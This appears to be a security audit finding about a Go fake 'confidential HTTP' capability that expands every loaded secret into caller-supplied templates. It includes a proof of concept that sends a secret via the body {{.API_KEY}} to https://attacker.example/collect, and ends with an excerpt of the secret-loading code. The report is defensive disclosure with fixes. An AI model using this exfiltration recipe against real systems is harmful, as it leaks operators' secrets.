### Title
Confidential HTTP fake capability expands all loaded `SECRET_*` values into attacker-controlled Go templates and exfiltrates them to a caller-supplied URL - (File: `core/capabilities/fakes/confidential_http_action.go`)

### Summary
`DirectConfidentialHTTPAction.SendRequest` loads every secret from the local secrets file/environment into a single `templateData` map and then executes that map against the `body` and `header` values taken directly from the caller-supplied `ConfidentialHTTPRequest`, using Go's `text/template`. Because the request `URL`, `body`, and `headers` are all attacker/workflow-controlled, any caller of this capability can embed `{{.SECRET_NAME}}` in the body/headers and have the real secret value substituted and sent to a URL they also control, exfiltrating the secret.

### Finding Description
`NewDirectConfidentialHTTPAction` reads a secrets YAML file (or `SECRETS_FILE` env override) and resolves every listed name against `os.Getenv`, populating `fc.secretsConfig.SecretsNames` with the **real secret values** [1](#0-0) .

In `SendRequest`, this same map is flattened unconditionally into `templateData`, exposing every loaded secret by name: [2](#0-1) 

This `templateData` is then used to execute a Go template parsed directly from the **caller-supplied request body**: [3](#0-2) 

and from every **caller-supplied header value**: [4](#0-3) 

The resulting HTTP request is sent to `req.GetUrl()`, which is also part of the same caller-controlled `input` [5](#0-4) [6](#0-5) .

This is the same bug class as the MagicMirror advisory: a redaction/secret-loading boundary (env-loaded `SECRET_*`/`secretsNames` values, intended only for legitimate outbound calls configured by the operator) is reversed by expanding placeholders found in an untrusted, caller-supplied payload before it is used, allowing the caller to both name the secret to expand (`{{.KEY}}`) and choose the destination (`req.Url`) that receives the expanded secret.

This capability (`confidential-http@1.0.0-alpha`) is registered as a real `ExecutableCapability`/`ClientCapability` implementation and is wired into the standalone/local CRE workflow engine tooling (`core/services/workflows/cmd/cre/utils/standalone_engine.go` references the `fakes` package), where an untrusted workflow definition supplies the `ConfidentialHTTPRequest` executed by this code. There is no allowlist restricting which template keys (i.e., which loaded secrets) a workflow may reference, and no restriction on the destination URL.

### Impact Explanation
Any workflow/request able to invoke this capability can extract arbitrary secrets loaded into `secretsConfig.SecretsNames` (which can include API keys, the AES-GCM encryption key `AESGCMEncryptionKeyName`, etc.) by referencing them via Go template syntax in the request body or headers, and directing the resulting request to an attacker-controlled endpoint. This is a direct confidentiality violation (CWE-200) equivalent to C:H in the referenced advisory: secrets meant to be handled only by the confidential-HTTP action internally are disclosed outward under caller control.

### Likelihood Explanation
Exploitation requires only the ability to submit a `ConfidentialHTTPRequest` (body/headers/URL) to this capability — no elevated privilege, no knowledge beyond guessing/knowing a secret key name loaded in `secretsConfig.SecretsNames`. Since the map is built from *all* configured secrets rather than a caller-specified allowlisted subset, and template execution silently no-ops on unknown keys (Go templates render `<no value>` rather than erroring), an attacker can enumerate valid keys by trial. This mirrors the "AC:L" reasoning in the referenced report.

### Recommendation
- Do not expose the full `secretsConfig.SecretsNames` map as template data to caller-supplied templates. Only allow substitution of secret names explicitly declared/allowlisted by the request's own trusted configuration (server-side), never a wildcard map derived from all loaded env secrets.
- Never let the destination `req.Url` and the templated body/headers both be controlled by the same untrusted caller — if secret substitution into outbound requests is a required feature, restrict the destination URL to an operator-configured allowlist.
- Add regression tests asserting that a request body/header containing `{{.SOME_LOADED_SECRET}}` is not expanded unless that specific key was explicitly authorized for that request/workflow.

### Proof of Concept
1. Configure `secrets.yaml` (or `SECRETS_FILE`) with `secretsNames: { API_KEY: [API_KEY_ALL] }` and set `API_KEY_ALL` env var to a real secret value, as in `NewDirectConfidentialHTTPAction` [7](#0-6) .
2. Submit a `ConfidentialHTTPRequest` with:
   - `Url`: attacker-controlled endpoint (e.g., `https://attacker.example/collect`)
   - `Method`: `POST`
   - `BodyString`: `{{.API_KEY}}`
3. `SendRequest` builds `templateData["API_KEY"] = "<real secret>"` [8](#0-7)  and executes the caller's body template against it [9](#0-8) , then POSTs the rendered body containing the real secret to the attacker's URL [6](#0-5) [10](#0-9) , disclosing `API_KEY_ALL`'s value to the attacker.

func NewDirectConfidentialHTTPAction(lggr logger.Logger, secretsPath string) *DirectConfidentialHTTPAction {
	fc := &DirectConfidentialHTTPAction{
		lggr: lggr,
	}

	// Load secrets
	secretsFile := secretsPath
	if envFile := os.Getenv("SECRETS_FILE"); envFile != "" {
		secretsFile = envFile
	}

	if data, err := os.ReadFile(secretsFile); err == nil {
		if marshalErr := yaml.Unmarshal(data, &fc.secretsConfig); marshalErr != nil {
			lggr.Warnf("Failed to parse secrets file %s: %v", secretsFile, marshalErr)
		} else {
			lggr.Infof("Loaded secrets from %s", secretsFile)
			// Resolve environment variables
			for key, val := range fc.secretsConfig.SecretsNames {
				secrets := val
				for i, v := range secrets {
					if envVal := os.Getenv(v); envVal != "" {
						secrets[i] = envVal
					} else {
						lggr.Warnf("Secret environment variable %s not set", v)
					}
				}
				fc.secretsConfig.SecretsNames[key] = secrets
			}
		}
	} else {
		lggr.Infof("Could not read secrets file %s: %v. Continuing without local secrets.", secretsFile, err)
	}
